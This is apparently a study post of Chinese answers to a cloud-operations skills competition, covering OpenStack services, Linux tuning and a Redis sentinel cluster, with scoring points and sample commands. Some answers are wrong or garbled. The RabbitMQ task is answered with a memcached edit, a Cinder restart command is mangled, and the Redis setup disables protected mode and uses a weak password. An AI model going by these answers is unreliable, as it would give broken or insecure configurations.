<h3 id="【题目-13】Manila-服务安装与使用-0-5-分"><a href="#【题目-13】Manila-服务安装与使用-0-5-分" class="headerlink" title="【题目 13】Manila 服务安装与使用[0.5 分]"></a>【题目 13】Manila 服务安装与使用[0.5 分]</h3><p>在 控 制 和 计 算 节 点 上 分 别 使 用 </p>
<p>iaas-install-manila-controller.sh 和iaas-install-manila-compute.sh 脚本安装 manila 服务。安装服务后创建 default_share_type 共享类型（不使用驱动程序支持），接着创建一个大小为 2G 的共享存储名为 share01 并开放share01 目录对 OpenStack 管理网段使用权限。最后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 share01 共享存储正确创建并赋予权限计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# manila type-list</span><br><span class="line">+--------------------------------------+--------------------+------------+-----------                                                                                                    -+--------------------------------------+----------------------+-------------+</span><br><span class="line">| ID                                   | Name               | visibility | is_default                                                                                                     | required_extra_specs                 | optional_extra_specs | Description |</span><br><span class="line">+--------------------------------------+--------------------+------------+-----------                                                                                                    -+--------------------------------------+----------------------+-------------+</span><br><span class="line">| 11caa227-7ae2-40cf-bdd1-54ca6712dc5e | default_share_type | public     | YES                                                                                                            | driver_handles_share_servers : False |                      | None        |</span><br><span class="line">+--------------------------------------+--------------------+------------+-----------                                                                                                    -+--------------------------------------+----------------------+-------------+</span><br><span class="line">[root@controller ~]# manila list</span><br><span class="line">+--------------------------------------+---------+------+-------------+-----------+--                                                                                                    ---------+--------------------+-----------------------------+-------------------+</span><br><span class="line">| ID                                   | Name    | Size | Share Proto | Status    | I                                                                                                    s Public | Share Type Name    | Host                        | Availability Zone |</span><br><span class="line">+--------------------------------------+---------+------+-------------+-----------+--                                                                                                    ---------+--------------------+-----------------------------+-------------------+</span><br><span class="line">| b8e66c11-64e3-48f3-aed0-ca474aa57537 | share01 | 2    | NFS         | available | F                                                                                                    alse     | default_share_type | compute@lvm#lvm-single-pool | nova              |</span><br><span class="line">+--------------------------------------+---------+------+-------------+-----------+--                                                                                                    ---------+--------------------+-----------------------------+-------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建共享类型（不使用驱动程序支持）</span></span><br><span class="line">manila type-create default_share_type False</span><br><span class="line"><span class="comment">#创建一个大小为 2G 的共享存储名为 share01 并开放share01 目录对 OpenStack 管理网段使用权限</span></span><br><span class="line"> manila   create NFS 2 --name share01</span><br><span class="line"> manila access-allow share01 ip 192.168.100.0/24 --access-level rw</span><br></pre></td></tr></table></figure>

<h3 id="【题目-14】Barbican-服务安装与使用-0-5-分"><a href="#【题目-14】Barbican-服务安装与使用-0-5-分" class="headerlink" title="【题目 14】Barbican 服务安装与使用[0.5 分]"></a>【题目 14】Barbican 服务安装与使用[0.5 分]</h3><p>使用 iaas-install-barbican.sh 脚本安装 barbican 服务，安装服务完毕后，使用 openstack命令创建一个名为 secret01 的密钥，创建完成后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 secret01 密钥创建正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack secret list</span><br><span class="line">+------------------------------------------------------------------------+----------+---------------------------+--------+-----------------------------+-----------+------------+-------------+------+------------+</span><br><span class="line">| Secret href                                                            | Name     | Created                   | Status | Content types               | Algorithm | Bit length | Secret <span class="built_in">type</span> | Mode | Expiration |</span><br><span class="line">+------------------------------------------------------------------------+----------+---------------------------+--------+-----------------------------+-----------+------------+-------------+------+------------+</span><br><span class="line">| http://controller:9311/v1/secrets/3ffdbd31-b33e-4298-b8c8-104601cd4a72 | secret01 | 2022-10-13T01:45:56+00:00 | ACTIVE | &#123;u<span class="string">&#x27;default&#x27;</span>: u<span class="string">&#x27;text/plain&#x27;</span>&#125; | aes       |        256 | opaque      | cbc  | None       |</span><br><span class="line">+------------------------------------------------------------------------+----------+---------------------------+--------+-----------------------------+-----------+------------+-------------+------+------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openstack secret store --name secret01 --payload secretkey</span><br></pre></td></tr></table></figure>

<h3 id="【题目-15】Cloudkitty-服务安装与使用-1-分"><a href="#【题目-15】Cloudkitty-服务安装与使用-1-分" class="headerlink" title="【题目 15】Cloudkitty 服务安装与使用[1 分]"></a>【题目 15】Cloudkitty 服务安装与使用[1 分]</h3><p>使用 iaas-install-cloudkitty.sh 脚本安装 cloudkitty 服务，安装完毕后，启用 hashmap 评级模块，接着创建 volume_thresholds 组，创建服务匹配规则 volume.size，并设置每 GB 的价格为 0.01。接下来对应大量数据设置应用折扣，在组 volume_thresholds 中创建阈值，设置若超过 50GB 的阈值，应用 2%的折扣（0.98）。设置完成后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 hashmap 评级模块启用成功计 0.2 分</span><br><span class="line">2.检查服务匹配规则 volume.size 创建成功 0.8 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# cloudkitty hashmap service list</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| Name        | Service ID                           |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| volume.size | 8e4db95b-45ae-44fd-87d5-424b0aac9614 |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">[root@controller ~]#  openstack rating module <span class="built_in">enable</span> hashmap</span><br><span class="line">+---------+---------+----------+</span><br><span class="line">| Module  | Enabled | Priority |</span><br><span class="line">+---------+---------+----------+</span><br><span class="line">| hashmap | True    |        1 |</span><br><span class="line">+---------+---------+----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动评级模块</span></span><br><span class="line">openstack rating module <span class="built_in">enable</span> hashmap</span><br><span class="line"><span class="comment">#创建组</span></span><br><span class="line"> cloudkitty hashmap group   create volume_thresholds</span><br><span class="line"> +-------------------+--------------------------------------+</span><br><span class="line">| Name              | Group ID                             |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| volume_thresholds | cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line"><span class="comment">#创建服务</span></span><br><span class="line">cloudkitty hashmap service create volume.size</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| Name        | Service ID                           |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| volume.size | 8e4db95b-45ae-44fd-87d5-424b0aac9614 |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line"><span class="comment">#创建匹配规则</span></span><br><span class="line">cloudkitty hashmap mapping create -s 8e4db95b-45ae-44fd-87d5-424b0aac9614 -t flat  -g cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 0.01</span><br><span class="line">+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+</span><br><span class="line">| Mapping ID                           | Value | Cost       | Type | Field ID | Service ID                           | Group ID                             | Project ID |</span><br><span class="line">+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+</span><br><span class="line">| 65f9489f-035e-4bf7-8cf6-664fde0ca446 | None  | 0.01000000 | flat | None     | 8e4db95b-45ae-44fd-87d5-424b0aac9614 | cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 | None       |</span><br><span class="line">+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+</span><br><span class="line"><span class="comment">#创建阈值</span></span><br><span class="line">cloudkitty hashmap threshold create -s8e4db95b-45ae-44fd-87d5-424b0aac9614 -g cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 -t rate 50 0.98</span><br><span class="line">+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+</span><br><span class="line">| Threshold ID                         | Level       | Cost       | Type | Field ID | Service ID                           | Group ID                             | Project ID |</span><br><span class="line">+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+</span><br><span class="line">| 3f5a8dfe-2ed8-4e1b-b617-a5bc7ef8a187 | 50.00000000 | 0.98000000 | rate | None     | 8e4db95b-45ae-44fd-87d5-424b0aac9614 | cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 | None       |</span><br><span class="line">+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="【题目-16】OpenStack-平台内存优化-0-5-分"><a href="#【题目-16】OpenStack-平台内存优化-0-5-分" class="headerlink" title="【题目 16】OpenStack 平台内存优化[0.5 分]"></a>【题目 16】OpenStack 平台内存优化[0.5 分]</h3><p>搭建完 OpenStack 平台后，关闭系统的内存共享，打开透明大页。完成后提交控制节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查系统内存优化成功计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/kernel/mm/transparent_hugepage/defrag</span><br><span class="line">always madvise [never]</span><br></pre></td></tr></table></figure>

<p>过程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;never&#x27;</span> &gt; /sys/kernel/mm/transparent_hugepage/defrag</span><br><span class="line"><span class="built_in">cat</span> /sys/kernel/mm/transparent_hugepage/defrag</span><br><span class="line"> always madvise [never]</span><br></pre></td></tr></table></figure>

<h3 id="【题目-17】修改文件句柄数-0-5-分"><a href="#【题目-17】修改文件句柄数-0-5-分" class="headerlink" title="【题目 17】修改文件句柄数[0.5 分]"></a>【题目 17】修改文件句柄数[0.5 分]</h3><p>Linux 服务器大并发时，往往需要预先调优 Linux 参数。默认情况下，Linux 最大文件句柄数为 1024 个。当你的服务器在大并发达到极限时，就会报出“too many open files”。创建一台云主机，修改相关配置，将控制节点的最大文件句柄数永久修改为 65535。配置完成后提交 controller 点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查配置 linux 系统句柄数为 65535 成功计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#临时生效</span></span><br><span class="line"><span class="built_in">ulimit</span> -n 65535</span><br><span class="line"><span class="comment">#永久生效</span></span><br><span class="line">vi /etc/security/limits.conf</span><br><span class="line">* soft nofile 65535</span><br><span class="line">* hard nofile 65535</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看</span></span><br><span class="line"><span class="built_in">ulimit</span> -n</span><br></pre></td></tr></table></figure>

<h3 id="【题目-18】Linux-系统调优-防止-SYN-攻击-1-分"><a href="#【题目-18】Linux-系统调优-防止-SYN-攻击-1-分" class="headerlink" title="【题目 18】Linux 系统调优-防止 SYN 攻击[1 分]"></a>【题目 18】Linux 系统调优-防止 SYN 攻击[1 分]</h3><p>修改 controller 节点的相关配置文件，开启 SYN cookie，防止 SYN 洪水攻击。完成后提交 controller 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查开启 SYN cookie 配置计 1 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br><span class="line">net.ipv4.tcp_max_syn_backlog=2048</span><br><span class="line">net.ipv4.tcp_syncookies=1</span><br><span class="line">net.ipv4.tcp_syn_retries = 0</span><br><span class="line"><span class="comment">#配置生效</span></span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>

<h2 id="【任务-2】私有云服务运维-10分"><a href="#【任务-2】私有云服务运维-10分" class="headerlink" title="**【任务 **2】私有云服务运维[10分]"></a>**【任务 **2】私有云服务运维[10分]</h2><h3 id="【题目-1】OpenStack-开放镜像权限-0-5-分"><a href="#【题目-1】OpenStack-开放镜像权限-0-5-分" class="headerlink" title="【题目 1】OpenStack 开放镜像权限[0.5 分]"></a>【题目 1】OpenStack 开放镜像权限[0.5 分]</h3><p>使 用 OpenStack 私 有 云 平 台 ， 在 OpenStack 平台的 admin 项 目 中 使 用cirros-0.3.4-x86_64-disk.img 镜像文件创建名为 glance-cirros 的镜像，通过 OpenStack 命令将glance-cirros 镜像指定 demo 项目进行共享使用。配置完成后提交 controller 点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 glance-cirros 镜像权限开放正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack image add project glance-cirros demo</span><br><span class="line">+------------+--------------------------------------+</span><br><span class="line">| Field      | Value                                |</span><br><span class="line">+------------+--------------------------------------+</span><br><span class="line">| created_at | 2022-10-13T03:55:11Z                 |</span><br><span class="line">| image_id   | 5e98f80e-34a0-40f7-981a-ef35bb3d673c |</span><br><span class="line">| member_id  | cc5b38915a0343368e9e7b7560eeb6ca     |</span><br><span class="line">| schema     | /v2/schemas/member                   |</span><br><span class="line">| status     | pending                              |</span><br><span class="line">| updated_at | 2022-10-13T03:55:11Z                 |</span><br><span class="line">+------------+--------------------------------------+</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#上传镜像</span></span><br><span class="line">openstack image create glance-cirros --disk-format qcow2 --container bare --file cirros-0.3.4-x86_64-disk.img --project admin</span><br><span class="line"><span class="comment">#对demo项目进行共享使用</span></span><br><span class="line">openstack image add project glance-cirros demo</span><br></pre></td></tr></table></figure>

<h3 id="【题目-2】OpenStack-消息队列调优-0-5-分"><a href="#【题目-2】OpenStack-消息队列调优-0-5-分" class="headerlink" title="【题目 2】OpenStack 消息队列调优[0.5 分]"></a>【题目 2】OpenStack 消息队列调优[0.5 分]</h3><p>OpenStack 各服务内部通信都是通过 RPC 来交互，各 agent 都需要去连接 RabbitMQ；随着各服务 agent 增多，MQ 的连接数会随之增多，最终可能会到达上限，成为瓶颈。使用自行搭建的OpenStack私有云平台，分别通过用户级别、系统级别、配置文件来设置RabbitMQ服务的最大连接数为 10240，配置完成后提交修改节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 rabbitmq 服务最大连接数正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/memcached</span><br><span class="line">MAXCONN=&quot;10240&quot; </span><br><span class="line"></span><br><span class="line">#重启服务</span><br><span class="line">systemctl restart mecached</span><br></pre></td></tr></table></figure>

<h3 id="【题目-3】OpenStack-Glance-镜像压缩-0-5-分"><a href="#【题目-3】OpenStack-Glance-镜像压缩-0-5-分" class="headerlink" title="【题目 3】OpenStack Glance 镜像压缩[0.5 分]"></a>【题目 3】OpenStack Glance 镜像压缩[0.5 分]</h3><p>使用自行搭建的 OpenStack 平台。在 HTTP 服务中存在一个镜像为CentOS7.5-compress.qcow2 的镜像，请使用 qemu 相关命令，对该镜像进行压缩，压缩后的镜像命名为 chinaskill-js-compress.qcow2 并存放在&#x2F;root 目录下。完成后提交 controller 点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查镜像压缩正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-img  convert -c -O qcow2 CentOS7.5-compress.qcow2 /root/chinaskill-js-compress.qcow2</span><br></pre></td></tr></table></figure>

<h3 id="【题目-4】glance-对接-cinder-后端存储-0-5-分"><a href="#【题目-4】glance-对接-cinder-后端存储-0-5-分" class="headerlink" title="【题目 4】glance 对接 cinder 后端存储[0.5 分]"></a>【题目 4】glance 对接 cinder 后端存储[0.5 分]</h3><p>在自行搭建的 OpenStack平台中修改相关参数，使 glance 可以使用 cinder作为后端存储，将镜像存储于 cinder 卷中。使用 cirros-0.3.4-x86_64-disk.img 文件创建 cirros-image 镜像存储于 cirros-cinder 卷中，通过 cirros-image 镜像使用 cinder 卷启动盘的方式进行创建虚拟机。完成后提交修改节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查修改 glance 后端存储为 cinder 正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">controller</span> ~]<span class="comment"># vi /etc/glance/glance-api.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#show_multiple_locations = false</span></span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line">show_multiple_locations = true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">controller</span> ~]<span class="comment"># systemctl restart openstack-glance-*</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">controller</span> ~]<span class="comment"># vi /etc/cinder/cinder.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#allowed_direct_url_schemes =</span></span><br><span class="line">改为</span><br><span class="line">allowed_direct_url_schemes =cinder</span><br><span class="line"></span><br><span class="line"><span class="comment">#image_upload_use_internal_tenant = false</span></span><br><span class="line">改为</span><br><span class="line">image_upload_use_internal_tenant = true</span><br><span class="line"><span class="comment">#最后重启cinder</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">controller</span> ~]<span class="comment"># systemctl restart openstack-cinderack-cinder-scheduler.service httpd</span></span><br><span class="line"></span><br><span class="line">代码不全,还差一些操作,只有一半的分</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="【题目-5】OpenStack-Heat-运维：创建容器-0-5-分"><a href="#【题目-5】OpenStack-Heat-运维：创建容器-0-5-分" class="headerlink" title="【题目 5】OpenStack Heat 运维：创建容器[0.5 分]"></a>【题目 5】OpenStack Heat 运维：创建容器[0.5 分]</h3><p>在自行搭建的 OpenStack 私 有 云 平 台 上 ， 在 &#x2F;root 目录下编写 Heat 模 板create_container.yaml，要求执行 yaml 文件可以创建名为 heat-swift 的容器。完成后提交控制节点的用户名、密码和 IP 地址到答题框。（在提交信息前请准备好 yaml 模板执行的环境）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.执行 heat 模板文件成功创建容器计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> create_container.yaml</span><br><span class="line"></span><br><span class="line">heat_template_version: <span class="number">2018</span><span class="literal">-08-31</span></span><br><span class="line">description: create container</span><br><span class="line">resources:</span><br><span class="line">  user:</span><br><span class="line">    <span class="built_in">type</span>: OS::Swift::Container</span><br><span class="line">    properties:</span><br><span class="line">      name: heat<span class="literal">-swift</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#运行模板测试</span></span><br><span class="line">heat stack<span class="literal">-create</span> <span class="operator">-f</span> create_container.yaml  heat<span class="literal">-swift</span></span><br></pre></td></tr></table></figure>

<h3 id="【题目-6】OpenStack-Nova-清除缓存-0-5-分"><a href="#【题目-6】OpenStack-Nova-清除缓存-0-5-分" class="headerlink" title="【题目 6】OpenStack Nova 清除缓存[0.5 分]"></a>【题目 6】OpenStack Nova 清除缓存[0.5 分]</h3><p>在 OpenStack 平台的一台计算节点创建虚拟机，若是第一次在该节点创建次虚拟机，会先将镜像文件复制到该计算节点录&#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances&#x2F;_base。长期下来，该目录会占用比较大的磁盘空间而要清理。可以通过修改 nova 的配置文件来自动清理该缓存目录，即在该节点没有使用某镜像启动的云主机，那么这个镜像在过一定的时间后会被自动删除。配置完成后提交改动节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.检查 nova 配置自动清理缓存文件正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">vi /etc/nova/nova.conf</span><br><span class="line">[<span class="type">DEFAULT</span>]]</span><br><span class="line">remove_unused_base_images=true</span><br><span class="line">image_cache_manager_interval=<span class="number">2400</span></span><br><span class="line">remove_unused_original_minimum_age_seconds=<span class="number">86400</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="【题目-7】Redis-一主二从三哨兵模式-1-分"><a href="#【题目-7】Redis-一主二从三哨兵模式-1-分" class="headerlink" title="【题目 7】Redis 一主二从三哨兵模式[1 分]"></a>【题目 7】Redis 一主二从三哨兵模式[1 分]</h3><p>使用提供的 OpenStack 私有云平台，申请三台 CentOS7.9 系统的云主机，使用提供的http 源，在三个节点自行安装 Redis 服务并启动，配置 Redis 的访问需要密码，密码设置为123456。然后将这三个 Redis 节点配置为 Redis 的一主二从三哨兵架构，即一个 Redis 主节点，两个从节点，三个节点均为哨兵节点。配置完成后提交 Redis 主节点的用户名、密码和IP 地址到答题框。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.检查 redis 主从集群部署正确计 0.5 分</span><br><span class="line">2.检查 redis 集群部署为哨兵节点正确计 0.5 分</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>配置主从</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装redis</span></span><br><span class="line">yum install -y redis </span><br><span class="line"><span class="comment">#修改配置文件/etc/redis.conf</span></span><br><span class="line">1.先在网络部分注释掉单机连接那一行,即注释掉<span class="built_in">bind</span> 127.0.0.1 </span><br><span class="line">2.同样我们要将后台运行打开：daemonize no，设置为<span class="built_in">yes</span>。</span><br><span class="line">3.将 保护模式关闭：protected-mode <span class="built_in">yes</span> 改为：protected-mode no </span><br><span class="line"></span><br><span class="line">4.打开RDB持久化配置：</span><br><span class="line"><span class="comment">#RDB持久化策略 默认三种方式，[900秒内有1次修改],</span></span><br><span class="line"><span class="comment">#[300秒内有10次修改],[60秒内有10000次修改]即触发RDB持久化，</span></span><br><span class="line"><span class="comment">#我们可以手动修改该参数或新增策略</span></span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000 </span><br><span class="line"><span class="comment">#RDB文件名</span></span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"><span class="comment">#RDB文件存储路径</span></span><br><span class="line"><span class="built_in">dir</span> ./</span><br><span class="line">策略配置：</span><br><span class="line"><span class="comment">#在seconds秒内有changes次数据修改就触发RDB持久化</span></span><br><span class="line"></span><br><span class="line">5.开启AOF持久化配置</span><br><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line"><span class="comment">#AOF文件名</span></span><br><span class="line">appendfilename <span class="string">&quot;appendonly.aof&quot;</span></span><br><span class="line"><span class="comment">#AOF文件存储路径 与RDB是同一个参数,共用一个文件路径</span></span><br><span class="line"><span class="built_in">dir</span> ./  <span class="comment">#即bin目录下</span></span><br><span class="line"><span class="comment">#AOF策略，一般都是选择第一种[always:每个命令都记录],</span></span><br><span class="line"><span class="comment">#[everysec:每秒记录一次],[no:看机器的心情高兴了就记录，linux一般半个小时同步一次]</span></span><br><span class="line"><span class="comment">#appendfsync always</span></span><br><span class="line">appendfsync everysec</span><br><span class="line"><span class="comment"># appendfsync no</span></span><br><span class="line"><span class="comment">#aof文件大小比起上次重写时的大小,增长100%(配置可以大于100%)时,触发重写。</span></span><br><span class="line"><span class="comment">#[假如上次重写后大小为10MB，当AOF文件达到20MB时也会再次触发重写，以此类推</span></span><br><span class="line">auto-aof-rewrite-percentage 100 </span><br><span class="line"><span class="comment">#aof文件大小超过64MB*2时,触发重写，</span></span><br><span class="line"><span class="comment">#为何要乘以2，因为auto-aof-rewrite-percentage 100 是翻倍即100%，</span></span><br><span class="line"><span class="comment">#达到翻倍时才重写</span></span><br><span class="line">auto-aof-rewrite-min-size 64mb </span><br><span class="line">6.打开混合持久化：</span><br><span class="line"><span class="comment">#6.aof-use-rdb-preamble yes # 检查混合持久化是否打开，redis5.0后默认开启</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将修改后的配置文件传到其他节点</span></span><br><span class="line">scp /etc/redis.conf root@slave1:/etc/redis.conf</span><br><span class="line">scp /etc/redis.conf root@slave2:/etc/redis.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动redis将slave各节点配置成从机</span></span><br><span class="line">systemctl start redis</span><br><span class="line"> <span class="comment">#配置slave1</span></span><br><span class="line">redis-cli -p 6379</span><br><span class="line">&gt; slaveof 192.168.200.101 6379</span><br><span class="line">&gt; info replication</span><br><span class="line"> <span class="comment">#配置slave2</span></span><br><span class="line"> redis-cli -p 6379</span><br><span class="line">&gt; slaveof 192.168.200.101 6379</span><br><span class="line">&gt; info replication</span><br><span class="line"></span><br><span class="line"><span class="comment">#主节点查看配置是否成功</span></span><br><span class="line">redis-cli -p 6379</span><br><span class="line">&gt;info replication</span><br></pre></td></tr></table></figure>

<p><strong>配置三哨兵</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解压压缩包</span></span><br><span class="line">tar -zxvf redis-5.0.7.tar.gz -C /opt</span><br><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line">vim /opt/redis-5.0.7/sentinel.conf</span><br><span class="line">protected-mode no								<span class="comment">#17行，关闭保护模式</span></span><br><span class="line">port 26379										<span class="comment">#21行，Redis哨兵默认的监听端口</span></span><br><span class="line">daemonize <span class="built_in">yes</span>									<span class="comment">#26行，指定sentinel为后台启动</span></span><br><span class="line">logfile <span class="string">&quot;/var/log/sentinel.log&quot;</span>					<span class="comment">#36行，指定日志存放路径</span></span><br><span class="line"><span class="built_in">dir</span> <span class="string">&quot;/var/lib/redis/6379&quot;</span>						<span class="comment">#65行，指定数据库存放路径（没有这个文件夹需要手动创建）</span></span><br><span class="line">sentinel monitor mymaster 192.168.154.19 6379 2	<span class="comment">#84行，修改 指定该哨兵节点监控192.168.184.10:6379这个主节点，该主节点的名称是mymaster，最后的2的含义与主节点的故障判定有关：至少需要2个哨兵节点同意，才能判定主节点故障并进行故障转移</span></span><br><span class="line">sentinel down-after-milliseconds mymaster 30000	<span class="comment">#113行，判定服务器down掉的时间周期，默认30000毫秒（30秒）</span></span><br><span class="line">sentinel failover-timeout mymaster 180000		<span class="comment">#146行，故障节点的最大超时时间为180000（180秒）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动哨兵</span></span><br><span class="line"><span class="built_in">cd</span> /opt/redis-5.0.7/</span><br><span class="line">redis-sentinel sentinel.conf &amp;</span><br><span class="line"><span class="comment">#注意！先启动主服务器，再启动从服务器</span></span><br><span class="line"><span class="comment">#查看信息</span></span><br><span class="line">redis-cli -p 26379 info Sentinel</span><br><span class="line"><span class="comment"># Sentinel</span></span><br><span class="line">sentinel_masters:1</span><br><span class="line">sentinel_tilt:0</span><br><span class="line">sentinel_running_scripts:0</span><br><span class="line">sentinel_scripts_queue_length:0</span><br><span class="line">sentinel_simulate_failure_flags:0</span><br><span class="line">master0:name=mymaster,status=ok,address=192.168.58.30:6379,slaves=2,sentinels=3</span><br><span class="line">[1]+  完成                  redis-sentinel sentinel.conf</span><br></pre></td></tr></table></figure>



<h3 id="【题目-8】Redis-服务调优-AOF-1-分"><a href="#【题目-8】Redis-服务调优-AOF-1-分" class="headerlink" title="【题目 8】Redis 服务调优-AOF[1 分]"></a>【题目 8】Redis 服务调优-AOF[1 分]</h3><p>使用上一题安装的 Redis 服务。在 Redis 中，AOF 配置为以三种不同的方式在磁盘上执行 write 或者 fsync。假设当前 Redis 压力过大，请配置 Redis 不执行 fsync。除此之外，避免AOF 文件过大，Redis 会进行 AOF 重写，生成缩小的 AOF 文件。请修改配置，让 AOF 重写时，不进行 fsync 操作。配置完成后提交 Redis 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查配置 redis 不执行 fsync 正确计 0.5 分、</span><br><span class="line">2.检查配置 redis 进行 AOF 重写不执行 fsync 正确计 0.5 分</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">master</span> ~]<span class="comment"># vim /etc/redis.conf</span></span><br><span class="line"></span><br><span class="line">no<span class="literal">-appendfsync-on-rewrite</span> no</span><br><span class="line">aof<span class="literal">-rewrite-incremental-fsync</span> yes</span><br><span class="line"></span><br><span class="line"><span class="comment">#连个参数分别改为</span></span><br><span class="line"></span><br><span class="line">aof<span class="literal">-rewrite-incremental-fsync</span> no</span><br><span class="line">no<span class="literal">-appendfsync-on-rewrite</span> yes</span><br><span class="line"><span class="comment">#配置就是设置为yes时候，在aof重写期间会停止aof的fsync操作</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">master</span> ~]<span class="comment"># systemctl restart redis</span></span><br></pre></td></tr></table></figure>

